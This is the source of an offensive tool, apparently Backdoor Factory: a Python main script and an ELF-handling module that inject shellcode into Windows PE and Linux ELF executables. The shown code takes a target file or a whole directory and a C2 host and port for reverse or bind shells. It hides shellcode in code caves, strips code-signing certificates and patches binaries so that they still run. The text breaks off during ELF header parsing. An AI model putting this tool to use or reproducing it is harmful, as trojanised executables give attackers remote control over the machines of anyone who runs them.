__FILENAME__ = backdoor
#!/usr/bin/env python
'''
    BackdoorFactory (BDF) v2 - Tertium Quid 

    Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
    Without him, I would still be trying to do stupid things 
    with the elf format.
    Also thanks to Silvio Cesare with his 1998 paper 
    (http://vxheaven.org/lib/vsc01.html) which these ELF patching
    techniques are based on.

    Special thanks to Travis Morrow for poking holes in my ideas.

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
   
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''

import sys
import os
import signal
import time
from random import choice
from optparse import OptionParser
from pebin import pebin
from elfbin import elfbin


def signal_handler(signal, frame):
        print '\nProgram Exit'
        sys.exit(0)


class bdfMain():

    version = """\
         2.2.0
         """

    author = """\
         Author:    Joshua Pitts
         Email:     the.midnite.runr[a t]gmail<d o t>com
         Twitter:   @midnite_runr
         """

    #ASCII ART
    menu = ["-.(`-')  (`-')  _           <-"
        ".(`-') _(`-')                            (`-')\n"
        "__( OO)  (OO ).-/  _         __( OO)"
        "( (OO ).->     .->        .->   <-.(OO )  \n"
        "'-'---.\  / ,---.   \-,-----.'-'. ,--"
        ".\    .'_ (`-')----. (`-')----. ,------,) \n"
        "| .-. (/  | \ /`.\   |  .--./|  .'   /"
        "'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \n"
        "| '-' `.) '-'|_.' | /_) (`-')|      /)"
        "|  |  ' |( _) | |  |( _) | |  ||  |_.' | \n"
        "| /`'.  |(|  .-.  | ||  |OO )|  .   ' |"
        "  |  / : \|  |)|  | \|  |)|  ||  .   .' \n"
        "| '--'  / |  | |  |(_'  '--'\|  |\   \|"
        "  '-'  /  '  '-'  '  '  '-'  '|  |\  \  \n"
        "`------'  `--' `--'   `-----'`--' '--'"
        "`------'    `-----'    `-----' `--' '--' \n"
        "           (`-')  _           (`-')     "
        "              (`-')                    \n"
        "   <-.     (OO ).-/  _        ( OO).-> "
        "      .->   <-.(OO )      .->           \n"
        "(`-')-----./ ,---.   \-,-----./    '._"
        "  (`-')----. ,------,) ,--.'  ,-.        \n"
        "(OO|(_\---'| \ /`.\   |  .--./|'--...__)"
        "( OO).-.  '|   /`. '(`-')'.'  /        \n"
        " / |  '--. '-'|_.' | /_) (`-')`--.  .--'"
        "( _) | |  ||  |_.' |(OO \    /         \n"
        " \_)  .--'(|  .-.  | ||  |OO )   |  |   "
        " \|  |)|  ||  .   .' |  /   /)         \n"
        "  `|  |_)  |  | |  |(_'  '--'\   |  |    "
        " '  '-'  '|  |\  \  `-/   /`          \n"
        "   `--'    `--' `--'   `-----'   `--'    "
        "  `-----' `--' '--'   `--'            \n",

        "__________               "
        " __       .___                   \n"
        "\______   \_____    ____ "
        "|  | __ __| _/____   ___________ \n"
        " |    |  _/\__  \ _/ ___\|"
        "  |/ // __ |/  _ \ /  _ \_  __ \ \n"
        " |    |   \ / __ \\\\  \__"
        "_|    </ /_/ (  <_> |  <_> )  | \/\n"
        " |______  /(____  /\___  >"
        "__|_ \____ |\____/ \____/|__|   \n"
        "        \/      \/     \/"
        "     \/    \/                    \n"
        "___________              "
        "__                               \n"
        "\_   _____/____    _____/"
        "  |_  ___________ ___.__.        \n"
        " |    __) \__  \ _/ ___\ "
        "  __\/  _ \_  __ <   |  |        \n"
        " |     \   / __ \\\\  \__"
        "_|  | (  <_> )  | \/\___  |        \n"
        " \___  /  (____  /\___  >_"
        "_|  \____/|__|   / ____|        \n"
        "     \/        \/     \/  "
        "                 \/             \n"]

    signal.signal(signal.SIGINT, signal_handler)

    parser = OptionParser()
    parser.add_option("-f", "--file", dest="FILE", action="store",
                      type="string",
                      help="File to backdoor")
    parser.add_option("-s", "--shell", default="show", dest="SHELL", 
                      action="store", type="string",
                      help="Payloads that are available for use."
                      " Use 'show' to see payloads."
                      )
    parser.add_option("-H", "--hostip", default=None, dest="HOST",
                      action="store", type="string",
                      help="IP of the C2 for reverse connections.")
    parser.add_option("-P", "--port", default=None, dest="PORT",
                      action="store", type="int",
                      help="The port to either connect back to for reverse "
                      "shells or to listen on for bind shells")
    parser.add_option("-J", "--cave_jumping", dest="CAVE_JUMPING",
                      default=False, action="store_true",
                      help="Select this options if you want to use code cave"
                      " jumping to further hide your shellcode in the binary."
                      )
    parser.add_option("-a", "--add_new_section", default=False,
                      dest="ADD_SECTION", action="store_true",
                      help="Mandating that a new section be added to the "
                      "exe (better success) but less av avoidance")
    parser.add_option("-U", "--user_shellcode", default=None,
                      dest="SUPPLIED_SHELLCODE", action="store",
                      help="User supplied shellcode, make sure that it matches"
                      " the architecture that you are targeting."
                      )
    parser.add_option("-c", "--cave", default=False, dest="FIND_CAVES",
                      action="store_true",
                      help="The cave flag will find code caves that "
                      "can be used for stashing shellcode. "
                      "This will print to all the code caves "
                      "of a specific size."
                      "The -l flag can be use with this setting.")
    parser.add_option("-l", "--shell_length", default=380, dest="SHELL_LEN",
                      action="store", type="int",
                      help="For use with -c to help find code "
                      "caves of different sizes")
    parser.add_option("-o", "--output-file", default=None, dest="OUTPUT",
                      action="store", type="string",
                      help="The backdoor output file")
    parser.add_option("-n", "--section", default="sdata", dest="NSECTION",
                      action="store", type="string",
                      help="New section name must be "
                      "less than seven characters")
    parser.add_option("-d", "--directory", dest="DIR", action="store",
                      type="string",
                      help="This is the location of the files that "
                      "you want to backdoor. "
                      "You can make a directory of file backdooring faster by "
                      "forcing the attaching of a codecave "
                      "to the exe by using the -a setting.")
    parser.add_option("-w", "--change_access", default=True,
                      dest="CHANGE_ACCESS", action="store_false",
                      help="This flag changes the section that houses "
                      "the codecave to RWE. Sometimes this is necessary. "
                      "Enabled by default. If disabled, the "
                      "backdoor may fail.")
    parser.add_option("-i", "--injector", default=False, dest="INJECTOR",
                      action="store_true",
                      help="This command turns the backdoor factory in a "
                      "hunt and shellcode inject type of mechinism. Edit "
                      "the target settings in the injector module.")
    parser.add_option("-u", "--suffix", default=".old", dest="SUFFIX",
                      action="store", type="string",
                      help="For use with injector, places a suffix"
                      " on the original file for easy recovery")
    parser.add_option("-D", "--delete_original", dest="DELETE_ORIGINAL",
                      default=False, action="store_true",
                      help="For use with injector module.  This command"
                      " deletes the original file.  Not for use in production "
                      "systems.  *Author not responsible for stupid uses.*")
    parser.add_option("-O", "--disk_offset", dest="DISK_OFFSET", default=0,
                      type="int", action="store",
                      help="Starting point on disk offset, in bytes. "
                      "Some authors want to obfuscate their on disk offset "
                      "to avoid reverse engineering, if you find one of those "
                      "files use this flag, after you find the offset.")
    parser.add_option("-S", "--support_check", dest="SUPPORT_CHECK",
                      default=False, action="store_true",
                      help="To determine if the file is supported by BDF prior"
                      " to backdooring the file. For use by itself or with "
                      "verbose. This check happens automatically if the "
                      "backdooring is attempted."
                      )
    parser.add_option("-M", "--cave-miner", dest="CAVE_MINER", default=False, action="store_true",
                      help="Future use, to help determine smallest shellcode possible in a PE file"
                      )
    parser.add_option("-q", "--no_banner", dest="NO_BANNER", default=False, action="store_true",
                      help="Kills the banner."
                      )
    parser.add_option("-v", "--verbose", default=False, dest="VERBOSE",
                      action="store_true",
                      help="For debug information output.")
    parser.add_option("-T", "--image-type", dest="IMAGE_TYPE", default="ALL",
                      type='string',
                      action="store", help="ALL, x32, or x64 type binaries only. Default=ALL")
    parser.add_option("-Z", "--zero_cert", dest="ZERO_CERT", default=True, action="store_false",
                      help="Allows for the overwriting of the pointer to the PE certificate table"
                      " effectively removing the certificate from the binary for all intents"
                      " and purposes."
                      )
    parser.add_option("-R", "--runas_admin", dest="CHECK_ADMIN", default=False, action="store_true",
                      help="Checks the PE binaries for \'requestedExecutionLevel level=\"highestAvailable\"\'"
                      ". If this string is included in the binary, it must run as system/admin. Doing this "
                      "slows patching speed significantly."
                      )
    parser.add_option("-L", "--patch_dll", dest="PATCH_DLL", default=True, action="store_false",
                      help="Use this setting if you DON'T want to patch DLLs. Patches by default."
                     )

    (options, args) = parser.parse_args()

    def basicDiscovery(FILE):
        testBinary = open(FILE, 'rb')
        header = testBinary.read(4)
        testBinary.close()
        if 'MZ' in header:
            return 'PE'
        elif 'ELF' in header:
            return 'ELF'
        else:
            'Only support ELF and PE file formats'
            return None
        
    

    if options.NO_BANNER is False:
        print choice(menu)
        print author
        print version
        time.sleep(1)

    if options.DIR:
        for root, subFolders, files in os.walk(options.DIR):
            for _file in files:
                options.FILE = os.path.join(root, _file)
                if os.path.isdir(options.FILE) is True:
                    print "Directory found, continuing"
                    continue
                is_supported = basicDiscovery(options.FILE)
                if is_supported is "PE":
                    supported_file = pebin(options.FILE,
                                            options.OUTPUT,
                                            options.SHELL,
                                            options.NSECTION,
                                            options.DISK_OFFSET,
                                            options.ADD_SECTION,
                                            options.CAVE_JUMPING,
                                            options.PORT,
                                            options.HOST,
                                            options.SUPPLIED_SHELLCODE,
                                            options.INJECTOR,
                                            options.CHANGE_ACCESS,
                                            options.VERBOSE,
                                            options.SUPPORT_CHECK,
                                            options.SHELL_LEN,
                                            options.FIND_CAVES,
                                            options.SUFFIX,
                                            options.DELETE_ORIGINAL,
                                            options.CAVE_MINER,
                                            options.IMAGE_TYPE,
                                            options.ZERO_CERT,
                                            options.CHECK_ADMIN,
                                            options.PATCH_DLL
                                            )
                elif is_supported is "ELF":
                    supported_file = elfbin(options.FILE,
                                            options.OUTPUT,
                                            options.SHELL,
                                            options.HOST,
                                            options.PORT,
                                            options.SUPPORT_CHECK,
                                            options.FIND_CAVES,
                                            options.SHELL_LEN,
                                            options.SUPPLIED_SHELLCODE,
                                            options.IMAGE_TYPE
                                            )
                                        
                if options.SUPPORT_CHECK is True:
                    if os.path.isfile(options.FILE):
                        is_supported = False
                print "file", options.FILE
                try:
                    is_supported = supported_file.support_check()
                except Exception, e:
                    is_supported = False
                    print 'Exception:', str(e), '%s' % options.FILE
                if is_supported is False or is_supported is None:
                    print "%s is not supported." % options.FILE
                            #continue
                else:
                    print "%s is supported." % options.FILE
                #    if supported_file.flItms['runas_admin'] is True:
                #        print "%s must be run as admin." % options.FILE
                print "*" * 50
        
        if options.SUPPORT_CHECK is True:
            sys.exit()

        print ("You are going to backdoor the following "
               "items in the %s directory:"
               % options.DIR)
        dirlisting = os.listdir(options.DIR)
        for item in dirlisting:
            print "     {0}".format(item)
        answer = raw_input("Do you want to continue? (yes/no) ")
        if 'yes' in answer.lower():
            for item in dirlisting:
                #print item
                print "*" * 50
                options.FILE = options.DIR + '/' + item
                if os.path.isdir(options.FILE) is True:
                    print "Directory found, continuing"
                    continue
                
                print ("backdooring file %s" % item)
                result = None
                is_supported = basicDiscovery(options.FILE)
                try:
                    if is_supported is "PE":
                        supported_file = pebin(options.FILE,
                                                options.OUTPUT,
                                                options.SHELL,
                                                options.NSECTION,
                                                options.DISK_OFFSET,
                                                options.ADD_SECTION,
                                                options.CAVE_JUMPING,
                                                options.PORT,
                                                options.HOST,
                                                options.SUPPLIED_SHELLCODE,
                                                options.INJECTOR,
                                                options.CHANGE_ACCESS,
                                                options.VERBOSE,
                                                options.SUPPORT_CHECK,
                                                options.SHELL_LEN,
                                                options.FIND_CAVES,
                                                options.SUFFIX,
                                                options.DELETE_ORIGINAL,
                                                options.CAVE_MINER,
                                                options.IMAGE_TYPE,
                                                options.ZERO_CERT,
                                                options.CHECK_ADMIN,
                                                options.PATCH_DLL
                                                )
                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_pe()
                    elif is_supported is "ELF":
                        supported_file = elfbin(options.FILE,
                                                options.OUTPUT,
                                                options.SHELL,
                                                options.HOST,
                                                options.PORT,
                                                options.SUPPORT_CHECK,
                                                options.FIND_CAVES,
                                                options.SHELL_LEN,
                                                options.SUPPLIED_SHELLCODE,
                                                options.IMAGE_TYPE
                                                )
                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_elf()
                    
                    if result is None:
                        print 'Not Supported. Continuing'
                        continue
                    else:
                        print ("[*] File {0} is in backdoored "
                               "directory".format(supported_file.FILE))
                except Exception as e:
                    print "DIR ERROR",str(e)
        else:
            print("Goodbye")

        sys.exit()
    
    if options.INJECTOR is True:
        supported_file = pebin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.NSECTION,
                                options.DISK_OFFSET,
                                options.ADD_SECTION,
                                options.CAVE_JUMPING,
                                options.PORT,
                                options.HOST,
                                options.SUPPLIED_SHELLCODE,
                                options.INJECTOR,
                                options.CHANGE_ACCESS,
                                options.VERBOSE,
                                options.SUPPORT_CHECK,
                                options.SHELL_LEN,
                                options.FIND_CAVES,
                                options.SUFFIX,
                                options.DELETE_ORIGINAL,
                                options.IMAGE_TYPE,
                                options.ZERO_CERT,
                                options.CHECK_ADMIN,
                                options.PATCH_DLL
                                )
        supported_file.injector()
        sys.exit()

    if not options.FILE:
        parser.print_help()
        sys.exit()

    #OUTPUT = output_options(options.FILE, options.OUTPUT)
    is_supported = basicDiscovery(options.FILE)
    if is_supported is "PE":
        supported_file = pebin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.NSECTION,
                                options.DISK_OFFSET,
                                options.ADD_SECTION,
                                options.CAVE_JUMPING,
                                options.PORT,
                                options.HOST,
                                options.SUPPLIED_SHELLCODE,
                                options.INJECTOR,
                                options.CHANGE_ACCESS,
                                options.VERBOSE,
                                options.SUPPORT_CHECK,
                                options.SHELL_LEN,
                                options.FIND_CAVES,
                                options.SUFFIX,
                                options.DELETE_ORIGINAL,
                                options.CAVE_MINER,
                                options.IMAGE_TYPE,
                                options.ZERO_CERT,
                                options.CHECK_ADMIN,
                                options.PATCH_DLL
                                )
    elif is_supported is "ELF":
        supported_file = elfbin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.HOST,
                                options.PORT,
                                options.SUPPORT_CHECK,
                                options.FIND_CAVES,
                                options.SHELL_LEN,
                                options.SUPPLIED_SHELLCODE,
                                options.IMAGE_TYPE
                                )

    result = supported_file.run_this()
    if result is True:
        print "File {0} is in the 'backdoored' directory".format(supported_file.FILE)


    #END BDF MAIN

if __name__ == "__main__":

    bdfMain()

########NEW FILE########
__FILENAME__ = elfbin
#!/usr/bin/env python
'''
    
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''
import struct
import os
import sys
import shutil
#from intelCore import intelCore
from intel.LinuxIntelELF32 import linux_elfI32_shellcode
from intel.LinuxIntelELF64 import linux_elfI64_shellcode



class elf():
    """
    ELF data format class for BackdoorFactory.
    We don't need the ENTIRE format.
    """

    #setting linux header infomation
    e_ident = {"EI_MAG": "\x7f" + "ELF",
                "EI_CLASS": {0x01: "x86",
                             0x02: "x64"
                            },
                "EI_DATA_little": 0x01,
                "EI_DATA_big": 0x02,
                "EI_VERSION": 0x01,
                "EI_OSABI": {0x00: "System V",
                             0x01: "HP-UX",
                             0x02: "NetBSD",
                             0x03: "Linux",
                             0x06: "Solaris",
                             0x07: "AIX",
                             0x08: "IRIX",
                             0x09: "FreeBSD",
                             0x0C: "OpenBSD"
                             }, 
                "EI_ABIVERSION": 0x00,
                "EI_PAD": 0x07
                }

    e_type = {0x01: "relocatable",
              0x02: "executable",
              0x03: "shared",
              0x04: "core"
             }

    e_machine = {0x02: "SPARC",
                 0x03: "x86",
                 0x14: "PowerPC",
                 0x28: "ARM",
                 0x32: "IA-64",
                 0x3E: "x86-64",
                 0xB7: "AArch64"
                }
    e_version = 0x01
#end elf class 


class elfbin():
    """
    This is the class handler for the elf binary format
    """
    def __init__(self, FILE, OUTPUT, SHELL, HOST="127.0.0.1", PORT=8888, 
                 SUPPORT_CHECK=False, FIND_CAVES=False, SHELL_LEN=70,
                 SUPPLIED_SHELLCODE=None, IMAGE_TYPE="ALL"):
        #print FILE
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.bin_file = open(self.FILE, "r+b")
        self.SHELL = SHELL
        self.HOST = HOST
        self.PORT = PORT
        self.FIND_CAVES = FIND_CAVES
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.IMAGE_TYPE = IMAGE_TYPE
        self.supported_types = {
                                0x00:   #System V 
                                [[0x01, #32bit
                                  0x02  #64bit
                                  ], 
                                 [0x03, #x86
                                  0x3E  #x64
                                  ]],
                                0x03:   #linx 
                                [[0x01, #32bit
                                  0x02  #64bit
                                  ], 
                                 [0x03, #x86
                                  0x3E  #x64
                                  ]],
                            
                        }
        
    def run_this(self):
        '''
        Call this if you want to run the entire process with a ELF binary.
        '''
        #self.print_supported_types()
        if self.FIND_CAVES is True:
            self.support_check()
            self.gather_file_info()
            if self.supported is False:
                print self.FILE, "is not supported."
                sys.exit()
            print ("Looking for caves with a size of %s "
               "bytes (measured as an integer)"
               % self.SHELL_LEN)
            self.find_all_caves()
            sys.exit()
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                sys.exit()
            try:
                self.support_check()
            except Exception, e:
                self.supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if self.supported is False:
                print "%s is not supported." % self.FILE
                self.print_supported_types()
            else:
                print "%s is supported." % self.FILE
                
            sys.exit(-1)
        
       
        #self.print_section_name()
        
        return self.patch_elf()
        

    def find_all_caves(self):
        """
        This function finds all the codecaves in a inputed file.
        Prints results to screen. Generally not many caves in the ELF
        format.  And why there is no need to cave jump.
        """

        print "[*] Looking for caves"
        SIZE_CAVE_TO_FIND = 94
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.bin_file.seek(0)
        while True:
            try:
                s = struct.unpack("<b", self.bin_file.read(1))[0]
            except:
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1
        
        for caves in caveTracker:

            countOfSections = 0
            for section in self.sec_hdr.iteritems():
                #print 'section', section[1]
                section = section[1]
                sectionFound = False
                if caves[0] >= section['sh_offset'] and caves[1] <= (section['sh_size'] + section['sh_offset']) and \
                    caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print "We have a winner:", section['name']
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'sh_size', hex(section['sh_size'])
                    print 'sh_offset', hex(section['sh_offset'])
                    print 'End of Raw Data:', hex(section['sh_size'] + section['sh_offset'])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print "[*] Total of %s caves found" % len(caveTracker)


    def set_shells(self):
        """
        This function sets the shellcode.
        """
        print "[*] Setting selected shellcode"
        #x32
        if self.EI_CLASS == 0x1 and self.e_machine == 0x03:
            self.bintype = linux_elfI32_shellcode
        #x64
        if self.EI_CLASS == 0x2 and self.e_machine == 0x3E:
            self.bintype = linux_elfI64_shellcode
        if not self.SHELL:
            print "You must choose a backdoor to add: "
            for item in dir(self.bintype):
                if "__" in item:
                    continue
                elif ("returnshellcode" == item 
                    or "pack_ip_addresses" == item 
                    or "eat_code_caves" == item
                    or 'ones_compliment' == item
                    or 'resume_execution' in item
                    or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            sys.exit()
        if self.SHELL not in dir(self.bintype):
            print "The following %ss are available:" % str(self.bintype).split(".")[1]
            for item in dir(self.bintype):
                #print item
                if "__" in item:
                    continue
                elif ("returnshellcode" == item 
                    or "pack_ip_addresses" == item 
                    or "eat_code_caves" == item
                    or 'ones_compliment' == item
                    or 'resume_execution' in item
                    or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)

            sys.exit(-1)
        else:
            shell_cmd = self.SHELL + "()"
        self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE)
        self.allshells = getattr(self.shells, self.SHELL)(self.e_entry)
        self.shellcode = self.shells.returnshellcode()


    def print_supported_types(self):
        """
        Prints supported types
        """
        print "Supported system types:"
        for system_type in self.supported_types.iteritems():
            print "    ",elf.e_ident["EI_OSABI"][system_type[0]]
            print "     Arch type:"
            for class_type in system_type[1][0]:
                print "\t", elf.e_ident['EI_CLASS'][class_type]
            print "     Chip set:"
            for e_mach_type in system_type[1][1]:
                print "\t", elf.e_machine[e_mach_type]
            #print "Supported class types:"
            print "*"*25

        
    def support_check(self):
        """
        Checks for support
        """
        print "[*] Checking file support" 
        self.bin_file.seek(0)
        if self.bin_file.read(4) == elf.e_ident["EI_MAG"]:
            self.bin_file.seek(4, 0)
            class_type = struct.unpack("<B", self.bin_file.read(1))[0]

            self.bin_file.seek(7,0)
            sys_type = struct.unpack("<B", self.bin_file.read(1))[0]
            self.supported = False
            for system_type in self.supported_types.iteritems():    
                if sys_type == system_type[0]:
                    print "[*] System Type Supported:", elf.e_ident["EI_OSABI"][system_type[0]]
                    if class_type == 0x1 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32'):
                        self.supported = True
                    elif class_type == 0x2 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
                        self.supported = True
                    break

        else:
            self.supported = False

            
    def get_section_name(self, section_offset):
        """
        Get section names
        """
        self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset']+section_offset,0)
        name = ''
        j = ''
        while True:
            j = self.bin_file.read(1)
            if hex(ord(j)) == '0x0':
                break
            else:
                name += j
        #print "name:", name
        return name
    

    def set_section_name(self):
        """
        Set the section names
        """
        #print "self.s_shstrndx", self.e_shstrndx
         #how to find name section specifically
        for i in range(0, self.e_shstrndx + 1):
            self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])
            if self.sec_hdr[i]['name'] == ".text":
                #print "Found text section"
                self.text_section =  i
        
    
    def gather_file_info(self):
        '''
        Gather info about the binary
        '''
        print "[*] Gathering file info"
        bin = self.bin_file
        bin.seek(0)
        EI_MAG = bin.read(4)
        self.EI_CLASS = struct.unpack("<B", bin.read(1))[0]
        self.EI_DATA = struct.unpack("<B", bin.read(1))[0]
        if self.EI_DATA == 0x01:
            #little endian
            self.endian = "<"
        else:
            #big self.endian
            self.endian = ">"
        self.EI_VERSION = struct.unpack('<B', bin.read(1))[0]
        self.EI_OSABI = struct.unpack('<B', bin.read(1))[0]
        self.EI_ABIVERSION = struct.unpack('<B', bin.read(1))[0]
        self.EI_PAD = struct.unpack(self.endian + "BBBBBBB", bin.read(7))[0]
        self.e_type = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_machine = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_version = struct.unpack(self.endian + "I", bin.read(4))[0]
        #print "EI_Class", self.EI_CLASS
        if self.EI_CLASS == 0x01:
            #print "32 bit D:"
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "I", bin.read(4))[0]
            #print hex(self.e_entry)
            self.e_phoff = struct.unpack(self.endian + "I", bin.read(4))[0]
            self.e_shoff = struct.unpack(self.endian + "I", bin.read(4))[0]
        else:
            #print "64 bit B:"
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_phoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_shoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
        #print hex(self.e_entry)
        #print "e_phoff", self.e_phoff
        #print "e_shoff", self.e_shoff
        self.VrtStrtngPnt = self.e_entry
        self.e_flags = struct.unpack(self.endian + "I", bin.read(4))[0]
        self.e_ehsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shstrndx = struct.unpack(self.endian + "H", bin.read(2))[0]
        #self.e_version'] = struct.e_entry
        #section tables
        bin.seek(self.e_phoff,0)
        #header tables
        if self.e_shnum == 0:
            print "more than 0xFF00 sections, wtf?"
            #print "real number of section header table entries"
            #print "in sh_size."
            self.real_num_sections = self.sh_size
        else:
            #print "less than 0xFF00 sections, yay"
            self.real_num_sections = self.e_shnum
        #print "real_num_sections", self.real_num_sections

        bin.seek(self.e_phoff,0)
        self.prog_hdr = {}
        #print 'e_phnum', self.e_phnum
        for i in range(self.e_phnum):
            #print "i check e_phnum", i
            self.prog_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
            if self.prog_hdr[i]['p_type'] == 0x1 and self.prog_hdr[i]['p_vaddr'] < self.e_entry:
                self.offset_addr = self.prog_hdr[i]['p_vaddr'] 
                self.LocOfEntryinCode = self.e_entry - self.offset_addr
                #print "found the entry offset"

        bin.seek(self.e_shoff, 0)
        self.sec_hdr = {}
        for i in range(self.e_shnum):
            self.sec_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                #print self.sec_hdr[i]['sh_name']
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
